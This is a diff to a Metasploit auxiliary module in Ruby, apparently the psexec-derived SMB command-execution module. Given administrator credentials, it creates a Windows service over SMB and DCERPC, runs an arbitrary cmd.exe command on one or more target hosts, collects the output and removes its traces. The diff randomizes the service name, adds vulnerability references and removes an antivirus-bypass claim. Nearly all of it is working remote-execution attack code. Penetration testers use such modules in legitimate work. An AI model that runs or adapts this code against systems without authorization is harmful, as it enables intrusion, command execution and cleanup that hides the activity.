@@ -18,13 +18,13 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'SMB - Execute Windows Command',
-			'Description'    => %q{This module executes a *single* windows command on one or more hosts
-				by authenticating over SMB and passing a dcerpc request.  Daisy chaining commands wiht '&'
-				does not work and you shouldn't try it.  It steals code from the psexec
-				module so thanks very much to the author/s of that great tool.  This module is useful
-				because it does not need to upload any binaries to the target machine and therefore
-				should bypass most if not all Antivirus solutions
+			'Name'           => 'Microsoft Windows Authenticated Command Execution',
+			'Description'    => %q{
+					This module uses a valid administrator username and password to execute an
+				arbitrary command on one or more hosts, using a similar technique than the "psexec"
+				utility provided by SysInternals. Daisy chaining commands wiht '&' does not work
+				and users shouldn't try it. This module is useful because it doesn't need to upload
+				any binaries to the target machine.
 			},
 
 			'Author'         => [
@@ -33,7 +33,11 @@ class Metasploit3 < Msf::Auxiliary
 
 			'License'        => MSF_LICENSE,
 			'References'     => [
+				[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
+				[ 'OSVDB', '3106'],
+				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
 				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
+				[ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
 			],
 		))
 
@@ -45,8 +49,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		deregister_options('RHOST')
 	end
-
-
 
 	# This is the main controle method
 	def run_host(ip)
@@ -62,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_error("Unable to authenticate with given credentials: #{autherror}")
 				return
 			end
-			if execute_command(smbshare, ip, text, bat)
+			if execute_command(ip, text, bat)
 				o = get_output(smbshare, ip, text)
 			end
 			cleanup_after(smbshare, ip, text, bat)
@@ -70,24 +72,19 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-
 	# Executes specified Windows Command
-	def execute_command(smbshare, ip, text, bat)
+	def execute_command(ip, text, bat)
 		begin
 			#Try and execute the provided command
 			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			simple.connect(smbshare)
 			print_status("Executing your command on host: #{ip}")
-			psexec(smbshare, execute)
+			psexec(execute)
 			return true
 		rescue StandardError => exec_command_cerror
 			print_error("#{ip} - Unable to execute specified command: #{exec_command_error}")
 			return false	
 		end
 	end
-
-
 
 	# Retrive output from command
 	def get_output(smbshare, ip, file)
@@ -109,16 +106,13 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-
 	# This is the cleanup method, removes .txt and .bat file/s created during execution-
 	def cleanup_after(smbshare, ip, text, bat)
 		begin
 			# Try and do cleanup command
 			cleanup = "%COMSPEC% /C del %SYSTEMDRIVE%#{text} & del #{bat}"
-			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{ip}")
-			psexec(smbshare, cleanup)
+			psexec(cleanup)
 			if !check_cleanup(smbshare, ip, text)
 				print_error("#{ip} - Unable to cleanup.  Need to manually remove #{text} and #{bat} from the target.")
 			else
@@ -129,8 +123,6 @@ class Metasploit3 < Msf::Auxiliary
 			return cleanuperror
 		end
 	end
-
-
 
 	def check_cleanup(smbshare, ip, text)
 		simple.connect("\\\\#{ip}\\#{smbshare}")
@@ -148,13 +140,9 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-
 	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
-	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(smbshare, command)
-		servicename = "servicename"
-		simple.disconnect(smbshare)
+	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the COMMAND paramater
+	def psexec(command)
 
 		simple.connect("IPC$")
 
@@ -179,7 +167,7 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
-		#displayname = "displayname"
+		servicename = Rex::Text.rand_text_alpha(11)
 		displayname = Rex::Text.rand_text_alpha(16)
 		holdhandle = scm_handle
 		svc_handle  = nil
@@ -203,7 +191,7 @@ class Metasploit3 < Msf::Auxiliary
 			NDR.long(0) + # Password
 			NDR.long(0)  # Password
 		begin
-			vprint_status("Attempting to execute #{command}")
+			vprint_status("Creating the service...")
 			response = dcerpc.call(0x0c, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 				svc_handle = dcerpc.last_response.stub_data[0,20]
@@ -252,8 +240,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		vprint_status("Removing the service...")
 		stubdata =
-			svc_handle +
-			NDR.wstring("%WINDIR%\\Temp\\msfcommandoutput.txt")
+			svc_handle
 		begin
 			response = dcerpc.call(0x02, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
@@ -269,17 +256,8 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Error: #{e}")
 		end
 
-		begin
-			#print_status("Deleting \\#{filename}...")
-			select(nil, nil, nil, 1.0)
-			#This is not really useful but will prevent double \\ on the wire :)
-			simple.connect(smbshare)
-			simple.delete("%WINDIR%\\Temp\\msfcommandoutput.txt")
-		rescue StandardError => psexec_cleanup_error
-			print_error("Error occured cleaning up the service. #{psexec_cleanup_error}")
-		end
+		select(nil, nil, nil, 1.0)
 		simple.disconnect("IPC$")
-		simple.disconnect(smbshare)
 	end
 
 end
